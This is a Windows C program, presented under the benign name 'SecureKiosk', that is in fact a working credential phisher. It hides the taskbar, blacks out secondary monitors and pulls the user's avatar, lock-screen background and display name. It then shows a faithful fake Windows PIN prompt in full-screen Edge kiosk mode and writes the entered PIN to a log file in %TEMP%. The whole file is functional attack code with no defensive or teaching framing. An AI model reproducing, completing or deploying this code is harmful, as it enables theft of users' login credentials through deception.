#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <wincrypt.h>
#include <sddl.h>
#include <winreg.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

#define CREDENTIAL_LOG_CATEGORY 1

void logCredentialEntry(int category, int auxiliaryCode1, int auxiliaryCode2, const char* payloadData, uint32_t dataLength) {
    if (category != CREDENTIAL_LOG_CATEGORY) return;

    char outputFilePath[MAX_PATH];
    ExpandEnvironmentStringsA("%TEMP%\\SecureKiosk_credentials.log", outputFilePath, MAX_PATH);

    HANDLE logFileHandle = CreateFileA(outputFilePath, FILE_APPEND_DATA, FILE_SHARE_READ,
                                       NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (logFileHandle == INVALID_HANDLE_VALUE) return;

    SYSTEMTIME currentSystemTime;
    GetLocalTime(&currentSystemTime);
    char timeStampBuffer[64];
    _snprintf(timeStampBuffer, sizeof(timeStampBuffer), "[%04d-%02d-%02d %02d:%02d:%02d] ",
              currentSystemTime.wYear, currentSystemTime.wMonth, currentSystemTime.wDay,
              currentSystemTime.wHour, currentSystemTime.wMinute, currentSystemTime.wSecond);

    DWORD bytesWritten;
    WriteFile(logFileHandle, timeStampBuffer, (DWORD)strlen(timeStampBuffer), &bytesWritten, NULL);
    WriteFile(logFileHandle, payloadData, dataLength, &bytesWritten, NULL);
    WriteFile(logFileHandle, "\r\n", 2, &bytesWritten, NULL);
    CloseHandle(logFileHandle);
}

LRESULT CALLBACK darkOverlayWindowProcedure(HWND windowHandle, UINT messageCode, WPARAM wParam, LPARAM lParam) {
    switch (messageCode) {
        case WM_SETCURSOR:
            SetCursor(NULL);
            return TRUE;
        case WM_PAINT: {
            PAINTSTRUCT paintStructure;
            HDC deviceContext = BeginPaint(windowHandle, &paintStructure);
            FillRect(deviceContext, &paintStructure.rcPaint, (HBRUSH)GetStockObject(BLACK_BRUSH));
            EndPaint(windowHandle, &paintStructure);
            return 0;
        }
    }
    return DefWindowProcA(windowHandle, messageCode, wParam, lParam);
}

BOOL CALLBACK enumerateSecondaryDisplays(HMONITOR displayMonitor, HDC monitorDeviceContext, LPRECT monitorRectangle, LPARAM customParameter) {
    MONITORINFO monitorInformation;
    monitorInformation.cbSize = sizeof(MONITORINFO);
    GetMonitorInfoA(displayMonitor, &monitorInformation);

    if (monitorInformation.dwFlags & MONITORINFOF_PRIMARY) return TRUE;

    HINSTANCE applicationInstance = GetModuleHandleA(NULL);
    HWND overlayWindow = CreateWindowExA(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        "DarkOverlayWindow", "",
        WS_POPUP | WS_VISIBLE,
        monitorInformation.rcMonitor.left, monitorInformation.rcMonitor.top,
        monitorInformation.rcMonitor.right - monitorInformation.rcMonitor.left,
        monitorInformation.rcMonitor.bottom - monitorInformation.rcMonitor.top,
        NULL, NULL, applicationInstance, NULL
    );
    if (overlayWindow) {
        UpdateWindow(overlayWindow);
    }
    return TRUE;
}

void initializeSecureKioskEnvironment() {
    HWND taskbarWindowHandle = FindWindowA("Shell_TrayWnd", NULL);
    if (taskbarWindowHandle) ShowWindow(taskbarWindowHandle, SW_HIDE);

    HINSTANCE applicationInstance = GetModuleHandleA(NULL);
    WNDCLASSEXA windowClassAttributes = {0};
    windowClassAttributes.cbSize = sizeof(WNDCLASSEXA);
    windowClassAttributes.lpfnWndProc = darkOverlayWindowProcedure;
    windowClassAttributes.hInstance = applicationInstance;
    windowClassAttributes.lpszClassName = "DarkOverlayWindow";
    windowClassAttributes.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClassExA(&windowClassAttributes);

    EnumDisplayMonitors(NULL, NULL, enumerateSecondaryDisplays, 0);

    WSADATA winsockStartupData;
    WSAStartup(MAKEWORD(2, 2), &winsockStartupData);
    SOCKET serverSocketDescriptor = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in serverAddressStructure = {0};
    serverAddressStructure.sin_family = AF_INET;
    serverAddressStructure.sin_addr.s_addr = inet_addr("127.0.0.1");
    serverAddressStructure.sin_port = 0;
    bind(serverSocketDescriptor, (struct sockaddr*)&serverAddressStructure, sizeof(serverAddressStructure));
    int addressStructureLength = sizeof(serverAddressStructure);
    getsockname(serverSocketDescriptor, (struct sockaddr*)&serverAddressStructure, &addressStructureLength);
    int assignedNetworkPort = ntohs(serverAddressStructure.sin_port);
    listen(serverSocketDescriptor, SOMAXCONN);

    char localUsername[256] = "User";
    DWORD usernameLength = 256;
    GetUserNameA(localUsername, &usernameLength);

    HANDLE processTokenHandle;
    LPSTR userSidString = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &processTokenHandle)) {
        DWORD tokenInformationSize = 0;
        GetTokenInformation(processTokenHandle, TokenUser, NULL, 0, &tokenInformationSize);
        PTOKEN_USER tokenUserStructure = (PTOKEN_USER)malloc(tokenInformationSize);
        if (GetTokenInformation(processTokenHandle, TokenUser, tokenUserStructure, tokenInformationSize, &tokenInformationSize)) {
            ConvertSidToStringSidA(tokenUserStructure->User.Sid, &userSidString);
        }
        free(tokenUserStructure);
        CloseHandle(processTokenHandle);
    }

    char avatarImagePath[MAX_PATH] = {0};
    if (userSidString) {
        char registrySubkeyPath[512];
        _snprintf(registrySubkeyPath, sizeof(registrySubkeyPath),
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AccountPicture\\Users\\%s", userSidString);
        HKEY accountPictureRegistryKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, registrySubkeyPath, 0, KEY_READ, &accountPictureRegistryKey) == ERROR_SUCCESS) {
            DWORD pathBufferSize = sizeof(avatarImagePath);
            RegQueryValueExA(accountPictureRegistryKey, "Image448", NULL, NULL, (LPBYTE)avatarImagePath, &pathBufferSize);
            RegCloseKey(accountPictureRegistryKey);
        }
        LocalFree(userSidString);
    }
    if (strlen(avatarImagePath) == 0) {
        strcpy(avatarImagePath, "C:\\ProgramData\\Microsoft\\User Account Pictures\\user.png");
    }

    char backgroundImagePath[MAX_PATH] = {0};
    char localApplicationDataFolder[MAX_PATH] = {0};
    char roamingApplicationDataFolder[MAX_PATH] = {0};
    ExpandEnvironmentStringsA("%LocalAppData%", localApplicationDataFolder, MAX_PATH);
    ExpandEnvironmentStringsA("%AppData%", roamingApplicationDataFolder, MAX_PATH);

    char assetSearchPattern[MAX_PATH];
    _snprintf(assetSearchPattern, sizeof(assetSearchPattern),
              "%s\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets\\*",
              localApplicationDataFolder);
    WIN32_FIND_DATAA fileFindData;
    HANDLE assetFindHandle = FindFirstFileA(assetSearchPattern, &fileFindData);
    DWORD largestFileSize = 0;
    if (assetFindHandle != INVALID_HANDLE_VALUE) {
        do {
            if (!(fileFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                if (fileFindData.nFileSizeLow > largestFileSize && fileFindData.nFileSizeLow > 150000) {
                    largestFileSize = fileFindData.nFileSizeLow;
                    _snprintf(backgroundImagePath, sizeof(backgroundImagePath),
                              "%s\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets\\%s",
                              localApplicationDataFolder, fileFindData.cFileName);
                }
            }
        } while (FindNextFileA(assetFindHandle, &fileFindData));
        FindClose(assetFindHandle);
    }
    if (largestFileSize == 0) {
        _snprintf(backgroundImagePath, sizeof(backgroundImagePath), "%s\\Microsoft\\Windows\\Themes\\TranscodedWallpaper", roamingApplicationDataFolder);
    }

    char* base64EncodedBackground = NULL;
    HANDLE backgroundFileHandle = CreateFileA(backgroundImagePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (backgroundFileHandle != INVALID_HANDLE_VALUE) {
        DWORD backgroundFileSize = GetFileSize(backgroundFileHandle, NULL);
        if (backgroundFileSize > 0 && backgroundFileSize < 5000000) {
            BYTE* imageDataBuffer = (BYTE*)malloc(backgroundFileSize);
            DWORD bytesReadFromFile;
            if (ReadFile(backgroundFileHandle, imageDataBuffer, backgroundFileSize, &bytesReadFromFile, NULL)) {
                DWORD base64EncodedLength = 0;
                CryptBinaryToStringA(imageDataBuffer, backgroundFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64EncodedLength);
                base64EncodedBackground = (char*)malloc(base64EncodedLength + 1);
                CryptBinaryToStringA(imageDataBuffer, backgroundFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64EncodedBackground, &base64EncodedLength);
            }
            free(imageDataBuffer);
        }
        CloseHandle(backgroundFileHandle);
    }
    if (!base64EncodedBackground) {
        base64EncodedBackground = (char*)malloc(1);
        base64EncodedBackground[0] = '\0';
    }

    char* base64EncodedAvatar = NULL;
    HANDLE avatarFileHandle = CreateFileA(avatarImagePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (avatarFileHandle != INVALID_HANDLE_VALUE) {
        DWORD avatarFileSize = GetFileSize(avatarFileHandle, NULL);
        BYTE* imageDataBuffer = (BYTE*)malloc(avatarFileSize);
        DWORD bytesReadFromFile;
        if (ReadFile(avatarFileHandle, imageDataBuffer, avatarFileSize, &bytesReadFromFile, NULL)) {
            DWORD base64EncodedLength = 0;
            CryptBinaryToStringA(imageDataBuffer, avatarFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64EncodedLength);
            base64EncodedAvatar = (char*)malloc(base64EncodedLength + 1);
            CryptBinaryToStringA(imageDataBuffer, avatarFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64EncodedAvatar, &base64EncodedLength);
        }
        free(imageDataBuffer);
        CloseHandle(avatarFileHandle);
    }
    if (!base64EncodedAvatar) {
        base64EncodedAvatar = (char*)malloc(1);
        base64EncodedAvatar[0] = '\0';
    }

    char fullyQualifiedDisplayName[256] = {0};
    DWORD displayNameBufferSize = sizeof(fullyQualifiedDisplayName);
    BOOL displayNameRetrieved = FALSE;
    HMODULE securityModuleHandle = LoadLibraryA("secur32.dll");
    if (securityModuleHandle) {
        typedef BOOLEAN (WINAPI *GetUserNameExFunction)(int, LPSTR, PULONG);
        GetUserNameExFunction dynamicGetUserNameEx = (GetUserNameExFunction)GetProcAddress(securityModuleHandle, "GetUserNameExA");
        if (dynamicGetUserNameEx && dynamicGetUserNameEx(3, fullyQualifiedDisplayName, &displayNameBufferSize)) {
            displayNameRetrieved = TRUE;
        }
        FreeLibrary(securityModuleHandle);
    }
    if (!displayNameRetrieved) {
        displayNameBufferSize = sizeof(fullyQualifiedDisplayName);
        GetUserNameA(fullyQualifiedDisplayName, &displayNameBufferSize);
    }

    size_t htmlResponseSize = 8192 + strlen(base64EncodedAvatar) + strlen(base64EncodedBackground);
    char* htmlPayloadBuffer = (char*)malloc(htmlResponseSize);
    _snprintf(htmlPayloadBuffer, htmlResponseSize,
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n\r\n"
        "<!DOCTYPE html>"
        "<html lang=\"en\">"
        "<head>"
        "<meta charset=\"UTF-8\">"
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\">"
        "<style>"
        "*{margin:0;padding:0;box-sizing:border-box;}"
        "html,body{"
        "width:100%%;"
        "height:100%%;"
        "overflow:hidden;"
        "font-family:'Segoe UI',system-ui,sans-serif;"
        "}"
        "body{"
        "position:relative;"
        "background:url('data:image/jpeg;base64,%s') no-repeat center center fixed;"
        "background-size:cover;"
        "display:flex;"
        "align-items:center;"
        "justify-content:center;"
        "color:#fff;"
        "}"
        ".dimmingLayer{"
        "position:absolute;"
        "inset:0;"
        "background:rgba(0,0,0,0.25);"
        "backdrop-filter:blur(25px);"
        "-webkit-backdrop-filter:blur(25px);"
        "}"
        ".authenticationPanel{"
        "position:relative;"
        "z-index:2;"
        "width:340px;"
        "display:flex;"
        "flex-direction:column;"
        "align-items:center;"
        "}"
        ".userPortrait{"
        "width:120px;"
        "height:120px;"
        "border-radius:50%%;"
        "object-fit:cover;"
        "box-shadow:0 4px 18px rgba(0,0,0,0.35);"
        "margin-bottom:18px;"
        "}"
        ".displayNameLabel{"
        "font-size:26px;"
        "font-weight:600;"
        "line-height:1;"
        "margin-bottom:28px;"
        "text-shadow:0 1px 2px rgba(0,0,0,0.25);"
        "}"
        ".securityCodeContainer{"
        "width:290px;"
        "height:34px;"
        "border-radius:4px;"
        "background:rgba(38,38,52,0.55);"
        "border:1px solid rgba(255,255,255,0.15);"
        "backdrop-filter:blur(12px);"
        "-webkit-backdrop-filter:blur(12px);"
        "display:flex;"
        "align-items:center;"
        "padding:0 4px 0 12px;"
        "box-shadow:inset 0 1px 0 rgba(255,255,255,0.04);"
        "transition: border 0.2s;"
        "}"
        ".securityCodeContainer:focus-within{"
        "border:1px solid rgba(255,255,255,0.6);"
        "}"
        ".securityInput{"
        "width:100%%;"
        "background:transparent;"
        "border:none;"
        "outline:none;"
        "color:#fff;"
        "font-size:14px;"
        "}"
        ".securityInput::placeholder{"
        "color:rgba(255,255,255,0.92);"
        "}"
        ".confirmationButton{"
        "width:26px;height:26px;"
        "display:flex;align-items:center;justify-content:center;"
        "cursor:pointer;border-radius:4px;"
        "transition: background 0.1s;"
        "}"
        ".confirmationButton:hover{"
        "background:rgba(255,255,255,0.1);"
        "}"
        ".confirmationButton svg{"
        "width:16px;height:16px;"
        "stroke:white;fill:none;"
        "stroke-width:2;stroke-linecap:round;stroke-linejoin:round;"
        "}"
        ".assistanceLinks{"
        "margin-top:24px;"
        "display:flex;"
        "flex-direction:column;"
        "align-items:center;"
        "gap:24px;"
        "}"
        ".assistanceLinks div{"
        "font-size:14px;"
        "color:rgba(255,255,255,0.88);"
        "text-shadow:0 1px 2px rgba(0,0,0,0.25);"
        "cursor:pointer;"
        "}"
        ".statusIndicators{"
        "position:absolute;"
        "right:28px;"
        "bottom:24px;"
        "display:flex;"
        "gap:24px;"
        "z-index:2;"
        "}"
        ".symbolicIcon{"
        "width:18px;"
        "height:18px;"
        "opacity:.92;"
        "}"
        ".symbolicIcon svg{"
        "width:100%%;"
        "height:100%%;"
        "stroke:white;"
        "fill:none;"
        "stroke-width:1.7;"
        "stroke-linecap:round;"
        "stroke-linejoin:round;"
        "}"
        "</style>"
        "</head>"
        "<body>"
        "<div class='dimmingLayer'></div>"
        "<div class='authenticationPanel'>"
        "<img class='userPortrait' src='data:image/png;base64,%s'>"
        "<div class='displayNameLabel'>%s</div>"
        "<div class='securityCodeContainer'>"
        "<input type='password' id='securityInputField' class='securityInput' placeholder='PIN' autofocus>"
        "<div class='confirmationButton' id='submitButtonElement'>"
        "<svg viewBox='0 0 24 24'><path d='M5 12h14M12 5l7 7-7 7'></path></svg>"
        "</div>"
        "</div>"
        "<div class='assistanceLinks'>"
        "<div>I forgot my PIN</div>"
        "<div>Sign-in options</div>"
        "</div>"
        "</div>"
        "<div class='statusIndicators'>"
        "<div class='symbolicIcon'>"
        "<svg viewBox='0 0 24 24'>"
        "<rect x='4' y='5' width='10' height='14'></rect>"
        "<path d='M14 10h6v9h-6'></path>"
        "</svg>"
        "</div>"
        "<div class='symbolicIcon'>"
        "<svg viewBox='0 0 24 24'>"
        "<path d='M12 5a2 2 0 1 0 0.01 0'></path>"
        "<path d='M12 7v5'></path>"
        "<path d='M9 22l1-6'></path>"
        "<path d='M15 22l-1-6'></path>"
        "<path d='M8 13l4-1 4 1'></path>"
        "</svg>"
        "</div>"
        "<div class='symbolicIcon'>"
        "<svg viewBox='0 0 24 24'>"
        "<path d='M12 3v9'></path>"
        "<path d='M7 5.5a8 8 0 1 0 10 0'></path>"
        "</svg>"
        "</div>"
        "</div>"
        "<script>"
        "function transmitSecurityCode() {"
        "  var securityCode = document.getElementById('securityInputField').value;"
        "  if(securityCode.length > 0) {"
        "    document.body.style.cursor='wait';"
        "    fetch('/submit',{method:'POST', body: securityCode});"
        "  }"
        "}"
        "document.getElementById('securityInputField').addEventListener('keydown', function(event){"
        "  if(event.key === 'Enter') { transmitSecurityCode(); }"
        "});"
        "document.getElementById('submitButtonElement').addEventListener('click', transmitSecurityCode);"
        "</script>"
        "</body>"
        "</html>",
        base64EncodedBackground,
        base64EncodedAvatar,
        fullyQualifiedDisplayName
    );

    char edgeBrowserPath[MAX_PATH];
    _snprintf(edgeBrowserPath, sizeof(edgeBrowserPath), "%s\\Microsoft\\Edge\\Application\\msedge.exe", getenv("PROGRAMFILES(X86)"));
    if (GetFileAttributesA(edgeBrowserPath) == INVALID_FILE_ATTRIBUTES) {
        _snprintf(edgeBrowserPath, sizeof(edgeBrowserPath), "%s\\Microsoft\\Edge\\Application\\msedge.exe", getenv("PROGRAMFILES"));
    }

    char commandLineString[1024];
    _snprintf(commandLineString, sizeof(commandLineString), "\"%s\" --kiosk \"http://127.0.0.1:%d\" --edge-kiosk-type=fullscreen --no-first-run --disable-features=Translate", edgeBrowserPath, assignedNetworkPort);

    STARTUPINFOA processStartupConfiguration = { sizeof(processStartupConfiguration) };
    PROCESS_INFORMATION edgeProcessInformation = { 0 };
    CreateProcessA(NULL, commandLineString, NULL, NULL, FALSE, 0, NULL, NULL, &processStartupConfiguration, &edgeProcessInformation);

    Sleep(1500);
    HWND foregroundWindowHandle = GetForegroundWindow();
    SetWindowPos(foregroundWindowHandle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    SetForegroundWindow(foregroundWindowHandle);

    MSG windowMessage;
    while (1) {
        if (WaitForSingleObject(edgeProcessInformation.hProcess, 50) == WAIT_OBJECT_0) {
            break;
        }

        while (PeekMessage(&windowMessage, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&windowMessage);
            DispatchMessage(&windowMessage);
        }

        fd_set readFileDescriptorSet;
        FD_ZERO(&readFileDescriptorSet);
        FD_SET(serverSocketDescriptor, &readFileDescriptorSet);
        struct timeval selectTimeout = {0, 100000};
        if (select(0, &readFileDescriptorSet, NULL, NULL, &selectTimeout) > 0) {
            SOCKET clientConnectionSocket = accept(serverSocketDescriptor, NULL, NULL);
            if (clientConnectionSocket != INVALID_SOCKET) {
                char httpRequestBuffer[2048] = { 0 };
                recv(clientConnectionSocket, httpRequestBuffer, sizeof(httpRequestBuffer) - 1, 0);
                if (strncmp(httpRequestBuffer, "GET / ", 6) == 0) {
                    send(clientConnectionSocket, htmlPayloadBuffer, strlen(htmlPayloadBuffer), 0);
                }
                else if (strncmp(httpRequestBuffer, "POST /submit", 12) == 0) {
                    char* requestBody = strstr(httpRequestBuffer, "\r\n\r\n");
                    if (requestBody) {
                        requestBody += 4;
                        logCredentialEntry(CREDENTIAL_LOG_CATEGORY, 0, 0, requestBody, (uint32_t)strlen(requestBody));
                        const char* httpOkResponse = "HTTP/1.1 200 OK\r\n\r\n";
                        send(clientConnectionSocket, httpOkResponse, strlen(httpOkResponse), 0);
                        closesocket(clientConnectionSocket);
                        break;
                    }
                }
                closesocket(clientConnectionSocket);
            }
        }
    }

    TerminateProcess(edgeProcessInformation.hProcess, 0);
    CloseHandle(edgeProcessInformation.hProcess);
    CloseHandle(edgeProcessInformation.hThread);
    closesocket(serverSocketDescriptor);
    WSACleanup();
    free(htmlPayloadBuffer);

    HWND overlayWindowHandle;
    while ((overlayWindowHandle = FindWindowA("DarkOverlayWindow", NULL)) != NULL) {
        SendMessageA(overlayWindowHandle, WM_CLOSE, 0, 0);
    }
    UnregisterClassA("DarkOverlayWindow", applicationInstance);
    if (taskbarWindowHandle) ShowWindow(taskbarWindowHandle, SW_SHOW);
}

int WINAPI WinMain(HINSTANCE currentInstance, HINSTANCE previousInstance, LPSTR commandLineArguments, int windowDisplayMode) {
    initializeSecureKioskEnvironment();
    return 0;
}
